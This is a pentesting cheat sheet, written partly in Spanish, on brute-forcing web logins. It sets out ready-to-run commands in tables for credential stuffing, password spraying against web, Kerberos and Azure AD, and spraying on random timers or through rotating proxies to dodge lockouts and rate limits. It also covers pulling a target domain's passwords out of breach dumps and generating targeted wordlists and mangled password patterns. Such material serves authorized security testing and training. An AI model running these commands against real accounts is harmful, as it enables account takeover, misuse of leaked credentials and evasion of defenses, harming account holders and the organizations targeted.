---
aliases:
  - Credential Stuffing
  - Password Spray
  - Mangling Rules
  - Targeted Wordlists
tags:
  - type/technique
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[HTTP Brute Forcing]]'
---
# HTTP Brute Forcing - Wordlists y Strategy

***

## Credential Stuffing vs Password Spray

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -C combos.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` (combos formato `user:pass`) | Credential stuffing con leaked DB | High success rate. |
| `hydra -L users.txt -p 'Spring2025!' target.com http-post-form "..."` | Password spray (1 pass × N users) | Avoid lockout. |
| `kerbrute passwordspray -d target.local users.txt 'Welcome1!'` | AD password spray | Kerberos. |
| `MSOLSpray --userlist users.txt --password 'Spring2025!'` | O365/Azure AD spray | Cloud Microsoft. |
| `for u in $(cat users.txt); do for p in $(cat passes.txt); do (sleep $((RANDOM%60)) && curl -d "user=$u&pass=$p" https://target/login &); done; done` | Time-distributed spray | Anti-lockout. |
| `hashcat -a 7 wordlist.txt ?d?d?d?d --stdout > prefix-digit.txt` | Hybrid mask + wordlist | Pattern brute. |
| `hashcat -m <mode> -a 3 hash.txt ?u?l?l?l?d?d?d?d` | Mask attack pattern conocido | Known structure. |
| `for ip_proxy in $(cat proxies.txt); do curl --proxy "$ip_proxy" -d "user=$u&pass=$p" ...; done` | Geo-distributed via proxies | Per-IP rate bypass. |
^bf-strategy-stuffing-spray

___

## Leaked Databases

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `gzip -d /usr/share/wordlists/rockyou.txt.gz && head /usr/share/wordlists/rockyou.txt` | RockYou setup (14M passwords) | Default Kali. |
| `git clone https://github.com/danielmiessler/SecLists.git && ls SecLists/Passwords/` | SecLists wordlists curados | Foundation. |
| `wget https://wordlists-cdn.assetnote.io/data/...` (assetnote modern wordlists) | Assetnote curated maintenidos | Modern. |
| Browser → `haveibeenpwned.com/Passwords` (download 8.7GB SHA-1 hashes) | HIBP 800M+ pwned passwords | Validate hashes. |
| `curl -s https://api.pwnedpasswords.com/range/$(echo -n 'pass' \| sha1sum \| cut -c1-5)` | HIBP API range query | Live check. |
| `cat rockyou.txt SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \| sort -u > combined.txt` | Combine + dedupe | Bulk wordlist. |
| `grep -i '@target.com' breach.txt \| cut -d: -f2` | Extract passwords del breach by domain | Targeted stuffing. |
| Browser → `dehashed.com` con subscription → search domain target.com | OSINT breach DB | Subscription. |
^bf-strategy-leaked-dbs

### Wordlist sources

```bash
# RockYou
gzip -d /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt  # 14M

# SecLists comprehensive
git clone https://github.com/danielmiessler/SecLists.git
ls SecLists/Passwords/  # Common-Credentials, Leaked-Databases, etc

# HIBP downloadable hashes (SHA-1)
# Download from haveibeenpwned.com/Passwords (8.7GB)
```

___

## Targeted Wordlists (CeWL, CUPP, Wordlister)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `cewl -d 2 -m 5 -w cewl.txt https://target.com` | Crawl target + extract words (depth 2, min 5 chars) | Site-specific wordlist. |
| `cewl -d 3 -m 6 --with-numbers https://target.com -w deep.txt` | Deeper crawl + include numbers | Comprehensive. |
| `cupp -i` (interactive) | Personal info → password permutations | Targeted. |
| `crunch 8 8 abc123 -o brute8.txt` | Pure brute generator char-set | Custom charset. |
| `crunch 6 8 -t @@@@%%%% -o pattern.txt` (letras+digits pattern) | Pattern-based gen | Known structure. |
| `hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > mangled.txt` | Mangle wordlist con rules | Cobertura ampliada. |
| `git clone https://github.com/urbanadventurer/username-anarchy && ./username-anarchy -i "John Doe" -d target.com` | Username permutations (first.last → flast → etc) | Pre-spray prep. |
| `theHarvester -d target.com -b linkedin,google -f users.txt` | OSINT username harvest | Pre-brute discovery. |
| `cat names.txt \| while read n; do echo "${n}@target.com"; done > emails.txt` | Generate email list from names | Email-based attack. |
| `for y in 2023 2024 2025; do for s in '!' '@' '#' '$'; do echo "Target${y}${s}"; done; done` | Pattern-based generation seasonal | Default org patterns. |
^bf-strategy-targeted

___

## Mangling Rules

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mangled.txt` | Apply best64 rules (64 transformations) | Default. |
| `hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/dive.rule > deep-mangled.txt` | Apply dive rules (more aggressive) | Comprehensive. |
| `wget https://github.com/NotSoSecure/password_cracking_rules/raw/master/OneRuleToRuleThemAll.rule && hashcat --stdout wordlist.txt -r OneRuleToRuleThemAll.rule` | 52K-rule combination | Heavy. |
| `hashcat --stdout wordlist.txt -r best64.rule -r dive.rule > combined.txt` | Combined rules (multiplicative) | Bigger output. |
| `john --wordlist=wordlist.txt --rules=All --stdout > mangled.txt` | John ruleset alternative | Different style. |
| `hashcat --stdout wordlist.txt -j '$2 $0 $2 $5' > custom.txt` (custom rule inline) | Custom transformation rule | Per-target tuning. |
| `cat wordlist.txt \| sed 's/$/2025!/' > suffixed.txt` | Bash simple suffix append | Quick patterns. |
| `cat wordlist.txt \| while read w; do echo "${w}"; echo "${w}1"; echo "${w}!"; echo "${w}2025"; done > expanded.txt` | Bash multi-mutation | Manual. |
^bf-strategy-rules

___

## Pattern-Based Strategy

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `cat /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | Vendor defaults wordlist | Routers, IoT, network. |
| `cat /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | Top 1000 most common | Baseline spray. |
| `for s in 'Spring' 'Summer' 'Fall' 'Winter'; do for y in 2024 2025 2026; do echo "${s}${y}!"; done; done` | Seasonal patterns | Predictable corp. |
| `for m in January February March April; do for y in 2024 2025; do echo "${m}${y}!"; done; done` | Monthly patterns | Lazy users. |
| `for n in $(cat first_names.txt); do echo "${n}123"; echo "${n}!"; echo "${n}2025"; done` | First-name + suffix patterns | OSINT-driven. |
| `for org in target Target TARGET; do for y in 2024 2025; do for s in '!' '@' '#'; do echo "${org}${y}${s}"; done; done; done` | Org-specific patterns | Default corp passwords. |
| `crunch 8 8 -t %%%%%%%% -o phones.txt` (8 digits) | Phone-based patterns | OSINT phone. |
| `for d in 19{50..99} 20{00..15}; do for m in {01..12}; do for dd in {01..31}; do echo "${d}${m}${dd}"; done; done; done` (birthdays) | Birthday-format brute | OSINT birthday. |
^bf-strategy-patterns

***
